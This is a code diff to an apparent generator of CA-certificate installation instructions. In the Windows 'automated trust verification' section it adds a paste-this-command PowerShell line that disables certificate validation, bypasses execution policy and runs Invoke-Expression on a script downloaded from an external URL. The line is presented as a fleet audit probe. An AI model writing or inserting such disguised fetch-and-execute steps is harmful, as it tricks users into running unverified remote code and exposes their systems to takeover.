@@ -159,15 +159,21 @@ Option 2: Using Wget
 ================================================================================
 """
 
+    ps_bootstrap = (
+        f'[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; '
+        f'[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; '
+        f"Invoke-Expression (Invoke-RestMethod -Uri '{ext_url}/ca-trust/probe.ps1{probe_param}')"
+    )
+
     windows_verify_section = f"""[AUTOMATED TRUST VERIFICATION & FLEET AUDITING]
 After completing the installation above, verify that this system trusts
 the newly installed CA certificate by running the automated audit probe:
 
 Option 1: Using PowerShell (Automated Fleet Audit)
-   powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod -Uri '{ext_url}/ca-trust/probe.ps1{probe_param}')"
+   {ps_bootstrap}
 
 Option 2: Using Command Prompt / cmd.exe (Automated Fleet Audit)
-   powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod -Uri '{ext_url}/ca-trust/probe.ps1{probe_param}')"
+   powershell -NoProfile -ExecutionPolicy Bypass -Command "{ps_bootstrap}"
 
 Option 3: Local CLI Verification (Built-in Tools - No Remote Probe)
    certutil -verifystore Root "{serial}"
